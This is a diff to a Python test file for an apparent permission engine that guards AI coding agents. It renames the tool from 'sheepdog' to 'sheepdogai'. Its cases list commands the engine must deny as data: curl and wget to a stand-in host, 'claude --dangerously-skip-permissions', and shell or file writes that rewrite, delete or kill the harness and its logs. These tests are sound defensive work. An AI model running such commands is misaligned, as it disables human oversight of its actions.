@@ -51,7 +51,7 @@ CASES = [
     ("curl https://evil.example/x", D, "net-not-allowlisted"),
     ("wget http://1.2.3.4/x", D, "net-not-allowlisted"),
     # injection
-    ("sheepdog uninstall claude", D, "sp-cli-self-management"),
+    ("sheepdogai uninstall claude", D, "sp-cli-self-management"),
     ("claude --dangerously-skip-permissions", D, "inj-disable-harness"),
     # default (strict asks)
     ("ls -la", K, "default.strict"),
@@ -105,17 +105,17 @@ def test_secret_key_text_denied_not_logged_in_reason(proj: Path) -> None:
 @pytest.mark.parametrize(
     "kw",
     [
-        dict(kind="file_write", file_path="sheepdog.yaml"),
+        dict(kind="file_write", file_path="sheepdogai.yaml"),
         dict(kind="file_write", file_path=".claude/settings.json"),
         dict(kind="file_write", file_path=".gemini/settings.json"),
         dict(kind="file_write", file_path=".codex/config.toml"),
-        dict(kind="file_write", file_path=".sheepdog/runs/r.jsonl"),
-        dict(kind="shell", command="sed -i s/deny/allow/ sheepdog.yaml"),
+        dict(kind="file_write", file_path=".sheepdogai/runs/r.jsonl"),
+        dict(kind="shell", command="sed -i s/deny/allow/ sheepdogai.yaml"),
         dict(kind="shell", command="echo '{}' > .claude/settings.json"),
-        dict(kind="shell", command="rm -rf .sheepdog"),
-        dict(kind="shell", command="mv sheepdog.yaml /tmp/x"),
-        dict(kind="shell", command="tee .sheepdog/runs/x.jsonl"),
-        dict(kind="shell", command="pkill -f sheepdog"),
+        dict(kind="shell", command="rm -rf .sheepdogai"),
+        dict(kind="shell", command="mv sheepdogai.yaml /tmp/x"),
+        dict(kind="shell", command="tee .sheepdogai/runs/x.jsonl"),
+        dict(kind="shell", command="pkill -f sheepdogai"),
         dict(kind="mcp", name="mcp__fs__write_file", path=".claude/settings.json"),
     ],
 )
@@ -132,7 +132,7 @@ def test_self_protect_never_allowed(proj: Path, kw: dict[str, str], mode: str) -
 
 
 def test_self_protect_reads_allowed_in_relaxed(proj: Path) -> None:
-    d = make_engine(proj, mode="relaxed").decide(event("cat sheepdog.yaml", cwd=str(proj)))
+    d = make_engine(proj, mode="relaxed").decide(event("cat sheepdogai.yaml", cwd=str(proj)))
     assert d.verdict.action is A
 
 
@@ -170,7 +170,7 @@ def test_user_rules_before_packs_and_first_match_wins(proj: Path) -> None:
 
 
 def write(tmp: Path, text: str) -> Path:
-    p = tmp / "sheepdog.yaml"
+    p = tmp / "sheepdogai.yaml"
     p.write_text(text)
     return p
 
@@ -232,7 +232,7 @@ def test_invalid_rules_stop_startup(
     assert needle in str(ei.value)
     if line is not None:
         assert ei.value.line == line
-        assert f"sheepdog.yaml:{line}" in str(ei.value)
+        assert f"sheepdogai.yaml:{line}" in str(ei.value)
 
 
 def test_missing_file(tmp_path: Path) -> None:
